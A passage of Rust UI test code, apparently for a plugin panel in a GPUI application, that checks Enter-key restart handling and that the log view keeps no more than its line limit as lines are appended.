        let pane = rig.pane.clone();
        rig.cx.update(|window, cx| window.focus(&pane, cx));
        assert_eq!(rig.keys("enter"), []);

        rig.focus();
        assert_eq!(rig.keys("enter"), [Got::Restart]);
        rig.cx.simulate_input("nginx");
        let got = rig.keys("down enter");
        assert!(!got.is_empty(), "Enter no longer asks for Restart");
        assert!(got.iter().all(|got| *got == Got::Restart), "{got:?}");
    }

    /// Bounds, AC8 and TM-plug-10: the panel "shows the last 10,000
    /// lines"; the rows it lays out stay in step with the lines kept as
    /// the oldest are dropped, by single lines and by a flood, and the
    /// panel still draws.
    #[gpui::test]
    fn the_drawn_log_stays_in_step_with_the_kept_lines(cx: &mut TestAppContext) {
        use crate::plugins::panel::LOG_LINES;
        let mut rig = rig(cx);
        rig.set(vec![text("pulling"), Item::Log]);
        let rows = |rig: &mut Rig<'_>| {
            rig.draw();
            rig.panel.read_with(rig.cx, |panel, _| {
                (panel.log.item_count(), panel.model.log().len())
            })
        };
        let append = |rig: &mut Rig<'_>, text: &str| {
            rig.panel
                .update(rig.cx, |panel, cx| panel.append_log(text, cx));
        };

        append(&mut rig, "one\ntwo\nthree");
        assert_eq!(rows(&mut rig), (3, 3));
        let nearly: Vec<String> = (0..LOG_LINES - 5).map(|n| format!("line {n}")).collect();
        append(&mut rig, &nearly.join("\n"));
        assert_eq!(rows(&mut rig), (LOG_LINES - 2, LOG_LINES - 2));
        for n in 0..10 {
            append(&mut rig, &format!("more {n}"));
        }
        assert_eq!(rows(&mut rig), (LOG_LINES, LOG_LINES));
        let flood: Vec<String> = (0..3 * LOG_LINES).map(|n| format!("flood {n}")).collect();
        append(&mut rig, &flood.join("\n"));
        assert_eq!(rows(&mut rig), (LOG_LINES, LOG_LINES));
        let last = rig
            .panel
            .read_with(rig.cx, |panel, _| panel.model.log().back().cloned());
        assert_eq!(last.as_deref(), Some("flood 29999"));
    }
}
